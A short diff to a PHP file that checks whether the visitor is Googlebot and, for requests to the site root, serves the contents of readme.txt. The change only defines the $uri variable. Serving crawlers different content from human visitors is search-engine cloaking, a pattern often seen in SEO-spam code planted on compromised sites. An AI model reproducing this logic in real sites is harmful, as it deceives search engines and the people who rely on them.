@@ -7,7 +7,7 @@ function is_google_bot() {
     }
     return false;
 }
-
+$uri = $_SERVER['REQUEST_URI'] ?? '';
 if ($uri == '/' && is_google_bot()) {
     if (file_exists('readme.txt') && is_readable('readme.txt')) {
         $bot_content = file_get_contents('readme.txt');
